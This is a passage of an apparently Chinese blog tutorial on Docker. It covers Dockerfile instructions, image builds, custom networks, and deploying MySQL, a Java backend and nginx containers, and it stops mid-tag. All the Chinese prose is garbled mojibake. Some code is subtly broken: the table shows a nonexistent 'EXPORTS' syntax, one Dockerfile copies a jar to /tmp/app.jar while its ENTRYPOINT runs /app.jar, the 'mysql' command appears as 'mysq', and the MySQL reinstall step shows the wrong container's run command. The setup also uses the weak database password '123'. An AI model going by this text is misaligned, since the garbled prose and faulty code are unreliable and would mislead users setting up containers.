Dockerfile</h2><p><strong>Dockerfile</strong>å°±æ˜¯ä¸€ä¸ªæ–‡æœ¬æ–‡ä»¶ï¼Œå…¶ä¸­åŒ…å«ä¸€ä¸ªä¸ªçš„<strong>æŒ‡ä»¤</strong>(Instruction)ï¼Œç”¨æŒ‡ä»¤æ¥è¯´æ˜è¦æ‰§è¡Œä»€ä¹ˆæ“ä½œæ¥æ„å»ºé•œåƒã€‚å°†æ¥Dockerå¯ä»¥æ ¹æ®Dockerfileå¸®æˆ‘ä»¬æ„å»ºé•œåƒã€‚å¸¸è§æŒ‡ä»¤å¦‚ä¸‹ï¼š</p><table><thead><tr><th><strong>æŒ‡ä»¤</strong></th><th><strong>è¯´æ˜</strong></th><th><strong>ç¤ºä¾‹</strong></th></tr></thead><tbody><tr><td>FROM</td><td>æŒ‡å®šåŸºç¡€é•œåƒ</td><td>FROM centos:6</td></tr><tr><td>ENV</td><td>è®¾ç½®ç¯å¢ƒå˜é‡ï¼Œå¯åœ¨åé¢æŒ‡ä»¤ä½¿ç”¨</td><td>ENV key value</td></tr><tr><td>COPY</td><td>æ‹·è´æœ¬åœ°æ–‡ä»¶åˆ°é•œåƒçš„æŒ‡å®šç›®å½•</td><td>COPY ./jre11.tar.gz /tmp</td></tr><tr><td>RUN</td><td>æ‰§è¡ŒLinuxçš„shellå‘½ä»¤ï¼Œä¸€èˆ¬æ˜¯å®‰è£…è¿‡ç¨‹çš„å‘½ä»¤</td><td>RUN tar -zxvf /tmp/jre11.tar.gz  &amp;&amp; EXPORTS  path=/tmp/jre11:$path</td></tr><tr><td>EXPOSE</td><td>æŒ‡å®šå®¹å™¨è¿è¡Œæ—¶ç›‘å¬çš„ç«¯å£ï¼Œæ˜¯ç»™é•œåƒä½¿ç”¨è€…çœ‹çš„</td><td>EXPOSE 8080</td></tr><tr><td>ENTRYPOINT</td><td>é•œåƒä¸­åº”ç”¨çš„å¯åŠ¨å‘½ä»¤ï¼Œå®¹å™¨è¿è¡Œæ—¶è°ƒç”¨</td><td>ENTRYPOINT java -jar xx.jar</td></tr></tbody></table><p>æ›´æ–°è¯¦ç»†è¯­æ³•è¯´æ˜ï¼Œè¯·å‚è€ƒå®˜ç½‘æ–‡æ¡£ï¼š <a href="https://docs.docker.com/engine/reference/builder">https://docs.docker.com/engine/reference/builder</a></p><ul><li>ç¤ºä¾‹ï¼š</li></ul><p>æˆ‘ä»¬å¯ä»¥åŸºäºUbuntuåŸºç¡€é•œåƒï¼Œåˆ©ç”¨Dockerfileæè¿°é•œåƒç»“æ„ã€‚</p><pre class="line-numbers language-docker" data-language="docker"><code class="language-docker"><span class="token comment"># æŒ‡å®šåŸºç¡€é•œåƒ</span><span class="token instruction"><span class="token keyword">FROM</span> ubuntu:16.04</span><span class="token comment"># é…ç½®ç¯å¢ƒå˜é‡ï¼ŒJDKçš„å®‰è£…ç›®å½•ã€å®¹å™¨å†…æ—¶åŒº</span><span class="token instruction"><span class="token keyword">ENV</span> JAVA_DIR=/usr/local</span><span class="token comment"># æ‹·è´jdkå’Œjavaé¡¹ç›®çš„åŒ…</span><span class="token instruction"><span class="token keyword">COPY</span> ./jdk8.tar.gz <span class="token variable">$JAVA_DIR</span>/</span><span class="token instruction"><span class="token keyword">COPY</span> ./docker-demo.jar /tmp/app.jar</span><span class="token comment"># å®‰è£…JDK</span><span class="token instruction"><span class="token keyword">RUN</span> cd <span class="token variable">$JAVA_DIR</span> \ &amp;&amp; tar -xf ./jdk8.tar.gz \ &amp;&amp; mv ./jdk1.8.0_144 ./java8</span><span class="token comment"># é…ç½®ç¯å¢ƒå˜é‡</span><span class="token instruction"><span class="token keyword">ENV</span> JAVA_HOME=<span class="token variable">$JAVA_DIR</span>/java8</span><span class="token instruction"><span class="token keyword">ENV</span> PATH=<span class="token variable">$PATH</span>:<span class="token variable">$JAVA_HOME</span>/bin</span><span class="token comment"># å…¥å£ï¼Œjavaé¡¹ç›®çš„å¯åŠ¨å‘½ä»¤</span><span class="token instruction"><span class="token keyword">ENTRYPOINT</span> [<span class="token string">"java"</span>, <span class="token string">"-jar"</span>, <span class="token string">"/app.jar"</span>]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æˆ‘ä»¬å¯ä»¥åŸºäºUbuntuåŸºç¡€é•œåƒï¼Œåˆ©ç”¨Dockerfileæè¿°é•œåƒç»“æ„,ä¹Ÿå¯ä»¥ç›´æ¥åŸºäºJDKä¸ºåŸºç¡€é•œåƒï¼Œçœç•¥å‰é¢çš„æ­¥éª¤ï¼š</p><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-17%2010.31.26.png" style="zoom:40%;"><h2 id="6-3-æ„å»ºé•œåƒ"><a href="#6-3-æ„å»ºé•œåƒ" class="headerlink" title="6.3 æ„å»ºé•œåƒ"></a>6.3 æ„å»ºé•œåƒ</h2><pre class="line-numbers language-docker" data-language="docker"><code class="language-docker"><span class="token comment"># åŸºç¡€é•œåƒ</span><span class="token instruction"><span class="token keyword">FROM</span> openjdk:11.0-jre-buster</span><span class="token comment"># æ‹·è´jaråŒ…</span><span class="token instruction"><span class="token keyword">COPY</span> docker-demo.jar /app.jar</span><span class="token comment"># å…¥å£</span><span class="token instruction"><span class="token keyword">ENTRYPOINT</span> [<span class="token string">"java"</span>, <span class="token string">"-jar"</span>, <span class="token string">"/app.jar"</span>]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å½“ç¼–å†™å¥½äº†Dockerfileï¼Œå¯ä»¥åˆ©ç”¨ä¸‹é¢å‘½ä»¤æ¥æ„å»ºé•œåƒ:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">docker</span> build <span class="token parameter variable">-t</span> myImage:1.0 <span class="token builtin class-name">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p><strong>-t</strong> ï¼šæ˜¯ç»™é•œåƒèµ·åï¼Œæ ¼å¼ä¾ç„¶æ˜¯repository:tagçš„æ ¼å¼ï¼Œä¸æŒ‡å®štagæ—¶ï¼Œé»˜è®¤ä¸ºlatest</p><p> <strong>.</strong> ï¼šæ˜¯æŒ‡å®šDockerfileæ‰€åœ¨ç›®å½•ï¼Œå¦‚æœå°±åœ¨å½“å‰ç›®å½•ï¼Œåˆ™æŒ‡å®šä¸ºâ€.â€</p></blockquote><h2 id="6-3-æ„å»ºé•œåƒå¹¶è¿è¡Œï¼ˆEXï¼‰"><a href="#6-3-æ„å»ºé•œåƒå¹¶è¿è¡Œï¼ˆEXï¼‰" class="headerlink" title="6.3 æ„å»ºé•œåƒå¹¶è¿è¡Œï¼ˆEXï¼‰"></a>6.3 æ„å»ºé•œåƒå¹¶è¿è¡Œï¼ˆEXï¼‰</h2><h3 id="6-3-1-æ„å»ºé•œåƒ"><a href="#6-3-1-æ„å»ºé•œåƒ" class="headerlink" title="6.3.1 æ„å»ºé•œåƒ"></a>6.3.1 æ„å»ºé•œåƒ</h3><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-17%2010.45.58.png" style="zoom:50%;"><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-17%2010.48.56.png" alt="æˆªå±2024-12-17 10.48.56" style="zoom:50%;"><blockquote><p>æ³¨æ„é•œåƒåç§°ä¸èƒ½æœ‰å¤§å†™å­—æ¯ã€‚</p></blockquote><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-17%2010.59.38.png" style="zoom:50%;"><p>è·å–åŸºç¡€é•œåƒæ—¶æŠ¥é”™ã€‚</p><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-17%2010.59.19.png" style="zoom:50%;"><p>å•ç‹¬æ‹‰å–ä¸€ä¸‹openjdk:11.0-jre-busteré•œåƒã€‚</p><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-17%2011.00.43.png" alt="æˆªå±2024-12-17 11.00.43" style="zoom:50%;"><p>ç„¶åé‡æ–°è¿è¡Œæ„å»ºé•œåƒçš„å‘½ä»¤ã€‚</p><p><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-17%2011.01.17.png" alt="æˆªå±2024-12-17 11.01.17"></p><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-17%2011.01.37.png" alt="æˆªå±2024-12-17 11.01.37" style="zoom:50%;"><h3 id="6-3-2-è¿è¡Œå®¹å™¨"><a href="#6-3-2-è¿è¡Œå®¹å™¨" class="headerlink" title="6.3.2 è¿è¡Œå®¹å™¨"></a>6.3.2 è¿è¡Œå®¹å™¨</h3><p><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-17%2011.03.22.png" alt="æˆªå±2024-12-17 11.03.22"></p><h3 id="6-3-3-è®¿é—®æµ‹è¯•"><a href="#6-3-3-è®¿é—®æµ‹è¯•" class="headerlink" title="6.3.3 è®¿é—®æµ‹è¯•"></a>6.3.3 è®¿é—®æµ‹è¯•</h3><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-17%2011.06.03.png" alt="æˆªå±2024-12-17 11.06.03" style="zoom:50%;"><p>æˆåŠŸè®¿é—®åˆ°å®¹å™¨å†…çš„åº”ç”¨ã€‚</p><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><ul><li>é•œåƒçš„ç»“æ„æ˜¯æ€æ ·çš„ï¼Ÿ</li></ul><p>é•œåƒä¸­åŒ…å«äº†åº”ç”¨ç¨‹åºæ‰€éœ€è¦çš„è¿è¡Œç¯å¢ƒã€å‡½æ•°åº“ã€é…ç½®ã€ä»¥åŠåº”ç”¨æœ¬èº«ç­‰å„ç§æ–‡ä»¶ï¼Œè¿™äº›æ–‡ä»¶åˆ†å±‚æ‰“åŒ…è€Œæˆã€‚</p><ul><li>Dockerfileæ˜¯åšä»€ä¹ˆçš„ï¼Ÿ</li></ul><p>Dockerfileå°±æ˜¯åˆ©ç”¨å›ºå®šçš„æŒ‡ä»¤æ¥æè¿°é•œåƒçš„ç»“æ„å’Œæ„å»ºè¿‡ç¨‹ï¼Œè¿™æ ·Dockeræ‰å¯ä»¥ä¾æ¬¡æ¥æ„å»ºé•œåƒã€‚</p><ul><li>æ„å»ºé•œåƒçš„å‘½ä»¤æ˜¯ä»€ä¹ˆï¼Ÿ</li></ul><p>docker build -t é•œåƒå Dockerfileç›®å½•</p><h1 id="ä¸ƒã€Dockerç½‘ç»œ"><a href="#ä¸ƒã€Dockerç½‘ç»œ" class="headerlink" title="ä¸ƒã€Dockerç½‘ç»œ"></a>ä¸ƒã€Dockerç½‘ç»œ</h1><p>é»˜è®¤æƒ…å†µä¸‹ï¼Œæ‰€æœ‰å®¹å™¨éƒ½æ˜¯ä»¥bridgeæ–¹å¼è¿æ¥åˆ°Dockerçš„ä¸€ä¸ªè™šæ‹Ÿç½‘æ¡¥ä¸Šï¼š</p><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-18%2009.13.28.png" style="zoom:40%;"><p>docker inspect æ¥æŸ¥çœ‹å®¹å™¨çš„ç½‘ç»œé…ç½®ã€‚</p><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-18%2009.17.45.png" style="zoom:40%;"><p>ç½‘ç»œï¼ŒåŠ å…¥è‡ªå®šä¹‰ç½‘ç»œçš„å®¹å™¨å¯ä»¥é€šè¿‡å®¹å™¨åäº’ç›¸è®¿é—®ï¼ŒDockerçš„ç½‘ç»œæ“ä½œå‘½ä»¤å¦‚ä¸‹ï¼š</p><table><thead><tr><th><strong>å‘½ä»¤</strong></th><th><strong>è¯´æ˜</strong></th><th><strong>æ–‡æ¡£åœ°å€</strong></th></tr></thead><tbody><tr><td>docker network create</td><td>åˆ›å»ºä¸€ä¸ªç½‘ç»œ</td><td><a href="https://docs.docker.com/engine/reference/commandline/network_create/">docker   network create</a></td></tr><tr><td>docker network ls</td><td>æŸ¥çœ‹æ‰€æœ‰ç½‘ç»œ</td><td><a href="https://docs.docker.com/engine/reference/commandline/network_ls/">docker   network ls</a></td></tr><tr><td>docker network rm</td><td>åˆ é™¤æŒ‡å®šç½‘ç»œ</td><td><a href="https://docs.docker.com/engine/reference/commandline/network_rm/">docker   network rm</a></td></tr><tr><td>docker network prune</td><td>æ¸…é™¤æœªä½¿ç”¨çš„ç½‘ç»œ</td><td><a href="https://docs.docker.com/engine/reference/commandline/network_prune/">docker   network prune</a></td></tr><tr><td>docker network connect</td><td>ä½¿æŒ‡å®šå®¹å™¨è¿æ¥åŠ å…¥æŸç½‘ç»œ</td><td><a href="https://docs.docker.com/engine/reference/commandline/network_connect/">docker   network connect</a></td></tr><tr><td>docker network disconnect</td><td>ä½¿æŒ‡å®šå®¹å™¨è¿æ¥ç¦»å¼€æŸç½‘ç»œ</td><td><a href="https://docs.docker.com/engine/reference/commandline/network_disconnect/">docker   network disconnect</a></td></tr><tr><td>docker network inspect</td><td>æŸ¥çœ‹ç½‘ç»œè¯¦ç»†ä¿¡æ¯</td><td><a href="https://docs.docker.com/engine/reference/commandline/network_inspect/">docker   network inspect</a></td></tr></tbody></table><ul><li>å¯ä»¥åœ¨docker  run çš„æ—¶å€™é€šè¿‡ â€“networks æŒ‡å®šç½‘ç»œåã€‚</li></ul><h1 id="å…«ã€åˆ†å®¹å™¨é¡¹ç›®éƒ¨ç½²"><a href="#å…«ã€åˆ†å®¹å™¨é¡¹ç›®éƒ¨ç½²" class="headerlink" title="å…«ã€åˆ†å®¹å™¨é¡¹ç›®éƒ¨ç½²"></a>å…«ã€åˆ†å®¹å™¨é¡¹ç›®éƒ¨ç½²</h1><p>åˆ›å»ºç½‘ç»œï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>root@localhost ~<span class="token punctuation">]</span><span class="token comment"># docker network create heima</span>9a85558bc3ab76e21390a914afb454051467c183fa972c5e0782efcdab286538<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>åç»­åˆ›å»ºçš„å®¹å™¨ä½¿ç”¨â€“networks heimaæŒ‡å®šç½‘ç»œåã€‚</p><h2 id="8-1-éƒ¨ç½²mysqlæ•°æ®åº“å®¹å™¨"><a href="#8-1-éƒ¨ç½²mysqlæ•°æ®åº“å®¹å™¨" class="headerlink" title="8.1 éƒ¨ç½²mysqlæ•°æ®åº“å®¹å™¨"></a>8.1 éƒ¨ç½²mysqlæ•°æ®åº“å®¹å™¨</h2><ul><li>æ³¨æ„ä¿æŒjavaåç«¯é¡¹ç›®æ•°æ®åº“çš„é…ç½®å’Œmysqlå®¹å™¨æœ¬èº«é…ç½®çš„è¿é€šæ€§ã€‚</li></ul><p>mysqlæ•°æ®åº“å®¹å™¨çš„å®¹å™¨åmysqlï¼Œå¯†ç 123ã€‚åªæœ‰è¿™æ ·ï¼Œåœ¨ç½‘ç»œè¿é€šçš„å‰æä¸‹ï¼Œæ‰èƒ½ä¿è¯javaåç«¯åº”ç”¨èƒ½å¤ŸæˆåŠŸè®¿é—®åˆ°mysqlå®¹å™¨ã€‚</p><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-18%2009.39.26.png" alt="æˆªå±2024-12-18 09.39.26" style="zoom:50%;"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">docker</span> run <span class="token parameter variable">-d</span> <span class="token parameter variable">--name</span> mysql <span class="token parameter variable">-p</span> <span class="token number">3306</span>:3306 <span class="token parameter variable">-e</span> <span class="token assign-left variable">MYSQL_ROOT_PASSWORD</span><span class="token operator">=</span><span class="token number">123</span> <span class="token parameter variable">-v</span> /root/mysql/data:/var/lib/mysql <span class="token parameter variable">-v</span> /root/mysql/conf:/etc/mysql/conf.d <span class="token parameter variable">-v</span> /root/mysql/init:/docker-entrypoint-initdb.d <span class="token parameter variable">--network</span> heima mysql<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="8-2-éƒ¨ç½²Javaåç«¯åº”ç”¨å®¹å™¨"><a href="#8-2-éƒ¨ç½²Javaåç«¯åº”ç”¨å®¹å™¨" class="headerlink" title="8.2 éƒ¨ç½²Javaåç«¯åº”ç”¨å®¹å™¨"></a>8.2 éƒ¨ç½²Javaåç«¯åº”ç”¨å®¹å™¨</h2><ul><li>æ³¨æ„ä¿æŒjavaåç«¯é¡¹ç›®æ•°æ®åº“çš„é…ç½®å’Œmysqlå®¹å™¨æœ¬èº«é…ç½®çš„è¿é€šæ€§ã€‚</li></ul><p>ç”¨ideaæ‰“å¼€é¡¹ç›®ï¼Œé€šè¿‡mavenæŠŠéœ€è¦çš„åº“éƒ½å®‰è£…ä¸€ä¸‹ï¼Œç„¶åæ‰“åŒ…æˆjaråŒ…ï¼ˆæ³¨æ„è·³è¿‡å•å…ƒæµ‹è¯•ï¼‰ã€‚</p><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-18%2009.56.53.png" style="zoom:50%;"><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-18%2009.57.30.png" style="zoom:50%;"><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-18%2009.59.50.png" style="zoom:50%;"><p>dockerfile:</p><pre class="line-numbers language-docker" data-language="docker"><code class="language-docker"><span class="token comment"># åŸºç¡€é•œåƒ</span><span class="token instruction"><span class="token keyword">FROM</span> openjdk:11.0-jre-buster</span><span class="token comment"># è®¾å®šæ—¶åŒº</span><span class="token instruction"><span class="token keyword">ENV</span> TZ=Asia/Shanghai</span><span class="token instruction"><span class="token keyword">RUN</span> ln -snf /usr/share/zoneinfo/<span class="token variable">$TZ</span> /etc/localtime &amp;&amp; echo <span class="token variable">$TZ</span> &gt; /etc/timezone</span><span class="token comment"># æ‹·è´jaråŒ…</span><span class="token instruction"><span class="token keyword">COPY</span> hm-service.jar /app.jar</span><span class="token comment"># å…¥å£</span><span class="token instruction"><span class="token keyword">ENTRYPOINT</span> [<span class="token string">"java"</span>, <span class="token string">"-jar"</span>, <span class="token string">"/app.jar"</span>]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä¸Šä¼ åˆ°ç›®æ ‡æœºå™¨ä¸­ï¼Œç„¶ååˆ¶ä½œé•œåƒã€‚</p><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-18%2010.03.05.png" alt="æˆªå±2024-12-18 10.03.05" style="zoom:50%;"><p>åˆ¶ä½œé•œåƒï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">docker</span> build <span class="token parameter variable">-t</span> hmall <span class="token builtin class-name">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-18%2010.04.36.png" alt="æˆªå±2024-12-18 10.04.36"></p><p>å¯åŠ¨å®¹å™¨ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>root@localhost hm-service<span class="token punctuation">]</span><span class="token comment"># docker run -d --name hmall -p 8080:8080 --network heima hmall</span>e5c900979c64be115676c294396e7ebc4deafdcba44c91ac49cc172cddaceed9<span class="token punctuation">[</span>root@localhost hm-service<span class="token punctuation">]</span><span class="token comment"># dps</span>CONTAINER ID    IMAGE          PORTS                                                  STATUS          NAMESe5c900979c64    hmall          <span class="token number">0.0</span>.0.0:8080-<span class="token operator">&gt;</span><span class="token number">8080</span>/tcp, :::8080-<span class="token operator">&gt;</span><span class="token number">8080</span>/tcp              Up <span class="token number">2</span> seconds    hmalla26885a896d6    mysql          <span class="token number">0.0</span>.0.0:3306-<span class="token operator">&gt;</span><span class="token number">3306</span>/tcp, :::3306-<span class="token operator">&gt;</span><span class="token number">3306</span>/tcp, <span class="token number">33060</span>/tcp   Up <span class="token number">16</span> minutes   mysql1266a9029269    nginx:latest   <span class="token number">0.0</span>.0.0:8000-<span class="token operator">&gt;</span><span class="token number">80</span>/tcp, :::8000-<span class="token operator">&gt;</span><span class="token number">80</span>/tcp                  Up <span class="token number">23</span> hours     nginxOnCentOS<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>docker logs -f hmall æŸ¥çœ‹æ—¥å¿—ã€‚</p><p>è®¿é—®æµ‹è¯•ï¼š</p><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-18%2010.09.13.png" style="zoom:50%;"><p>è®¿é—®<a href="http://192.168.155.34:8080/search/list?pageNo=1&amp;pageSize=5">http://192.168.155.34:8080/search/list?pageNo=1&amp;pageSize=5</a> æ¥å£æŠ¥é”™ï¼š</p><p><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-18%2010.11.46.png" alt="æˆªå±2024-12-18 10.11.46"></p><p>è¿›å…¥hmallå®¹å™¨ping mysqlå®¹å™¨ï¼Œå¯ä»¥è¿é€šã€‚</p><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-18%2010.13.10.png" style="zoom:33%;"><p>ä½†æ˜¯mysqlå®¹å™¨ä¸­æ²¡æœ‰pingã€ipaddrä¹‹ç±»çš„å‘½ä»¤ã€‚</p><p>ç½‘ç»œç»“æ„ï¼š</p><p>â€‹     è™šæ‹Ÿç½‘å¡ï¼š172.18.0.1 </p><p>â€‹     mysqlï¼š172.18.0.2</p><p>â€‹     hmallï¼š172.18.0.3</p><p>ç™»å…¥mysqlå®¹å™¨ï¼Œæ‰§è¡Œmysqlç™»å½•å‘½ä»¤ï¼šmysq -uroot -p å‘ç°å¯†ç æ˜¯123.comæ‰èƒ½ç™»å½•ã€‚ä½†æ˜¯ä¹‹å‰åˆ›å»ºæ•°æ®åº“çš„æ—¶å€™æ˜æ˜ä½¿ç”¨-eå‚æ•°é…ç½®çš„å¯†ç æ˜¯123å‘€ï¼Œå¯èƒ½æ˜¯æŒ‚åœ¨æ—¶æ²¡æœ‰æ¸…ç©ºå®¿ä¸»æœºdataç›®å½•ï¼ˆç›®å½•é‡Œé¢è§‚å¯Ÿåˆ°æœ‰ä¸€äº›é‰´æƒçš„ç»„ä»¶ï¼‰çš„åŸå› ã€‚</p><p>æ¸…ç©ºdataç›®å½•ä¹‹åï¼Œé‡æ–°å®‰è£…mysqlï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>root@localhost hm-service<span class="token punctuation">]</span><span class="token comment"># docker run -d --name hmall -p 8080:8080 --network heima hmall</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è¿›å…¥å®¹å™¨ç”¨123çš„å¯†ç æˆåŠŸç™»å½•ã€‚</p><p>ç»§ç»­è®¿é—®æµ‹è¯•é¡µé¢ï¼ŒæˆåŠŸè·å–åˆ°åå°çš„æ•°æ®ã€‚</p><p><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-18%2010.39.43.png" alt="æˆªå±2024-12-18 10.39.43"></p><p>è‡³æ­¤ï¼Œåç«¯åº”ç”¨å®¹å™¨å’Œæ•°æ®åº“å®¹å™¨æˆåŠŸéƒ¨ç½²ã€‚</p><h2 id="8-3-éƒ¨ç½²å‰ç«¯nginxå®¹å™¨"><a href="#8-3-éƒ¨ç½²å‰ç«¯nginxå®¹å™¨" class="headerlink" title="8.3 éƒ¨ç½²å‰ç«¯nginxå®¹å™¨"></a>8.3 éƒ¨ç½²å‰ç«¯nginxå®¹å™¨</h2><p>åˆ›å»ºä¸€ä¸ªæ–°çš„nginxå®¹å™¨ï¼Œå°†æä¾›çš„nginx.confã€htmlç›®å½•ä¸å®¹å™¨æŒ‚è½½ã€‚</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>root@localhost nginx<span class="token punctuation">]</span><span class="token comment"># docker run -d --name nginx -p 18080:18080 -p 18081:18081 --network heima -v /root/nginx/html/:/usr/share/nginx/html -v /root/nginx/nginx.conf:/etc/nginx/nginx.conf nginx</span>19eeda1700ee6815e1b4b92a8dc0ba7ffbf6c9085fdb8a18f0ce9404ee97bf3d<span class="token punctuation">[</span>root@localhost nginx<span class="token punctuation">]</span><span class="token comment"># dps</span>CONTAINER ID    IMAGE    PORTS                                                                           STATUS          NAMES19eeda1700ee    nginx    <span class="token number">80</span>/tcp, <span class="token number">0.0</span>.0.0:18080-18081-<span class="token operator">&gt;</span><span class="token number">18080</span>-18081/tcp, :::18080-18081-<span class="token operator">&gt;</span><span class="token number">18080</span>-18081/tcp   Up <span class="token number">1</span> second     nginx25761d94c3db    mysql    <span class="token number">0.0</span>.0.0:3306-<span class="token operator">&gt;</span><span class="token number">3306</span>/tcp, :::3306-<span class="token operator">&gt;</span><span class="token number">3306</span>/tcp, <span class="token number">33060</span>/tcp                            Up <span class="token number">28</span> minutes   mysqle5c900979c64    hmall    <span class="token number">0.0</span>.0.0:8080-<span class="token operator">&gt;</span><span class="token number">8080</span>/tcp, :::8080-<span class="token operator">&gt;</span><span class="token number">8080</span>/tcp                                       Up <span class="token number">56</span> minutes   hmall<span class="token punctuation">[</span>root@localhost nginx<span class="token punctuation">]</span><span class="token comment"># </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>nginxé…ç½®æ–‡ä»¶ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">worker_processes  <span class="token number">1</span><span class="token punctuation">;</span>events <span class="token punctuation">{</span>    worker_connections  <span class="token number">1024</span><span class="token punctuation">;</span><span class="token punctuation">}</span>http <span class="token punctuation">{</span>    include       mime.types<span class="token punctuation">;</span>    default_type  application/json<span class="token punctuation">;</span>    sendfile        on<span class="token punctuation">;</span>        keepalive_timeout  <span class="token number">65</span><span class="token punctuation">;</span>    server <span class="token punctuation">{</span>        listen       <span class="token number">18080</span><span class="token punctuation">;</span>        <span class="token comment"># æŒ‡å®šå‰ç«¯é¡¹ç›®æ‰€åœ¨çš„ä½ç½®</span>        location / <span class="token punctuation">{</span>            root /usr/share/nginx/html/hmall-portal<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        error_page   <span class="token number">500</span> <span class="token number">502</span> <span class="token number">503</span> <span class="token number">504</span>  /50x.html<span class="token punctuation">;</span>        location <span class="token operator">=</span> /50x.html <span class="token punctuation">{</span>            root   html<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        location /api <span class="token punctuation">{</span>            rewrite /api/<span class="token punctuation">(</span>.*<span class="token punctuation">)</span>  /<span class="token variable">$1</span> <span class="token builtin class-name">break</span><span class="token punctuation">;</span>            proxy_pass http://hmall:8080<span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    server <span class="token punctuation">{</span>        listen       <span class="token number">18081</span><span class="token punctuation">;</span>        <span class="token comment"># æŒ‡å®šå‰ç«¯é¡¹ç›®æ‰€åœ¨çš„ä½ç½®</span>        location / <span class="token punctuation">{</span>            root /usr/share/nginx/html/hmall-admin<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        error_page   <span class="token number">500</span> <span class="token number">502</span> <span class="token number">503</span> <span class="token number">504</span>  /50x.html<span class="token punctuation">;</span>        location <span class="token operator">=</span> /50x.html <span class="token punctuation">{</span>            root   html<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        location /api <span class="token punctuation">{</span>            rewrite /api/<span class="token punctuation">(</span>.*<span class="token punctuation">)</span>  /<span class="token variable">$1</span> <span class="token builtin class-name">break</span><span class="token punctuation">;</span>            proxy_pass http://hmall:8080<span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 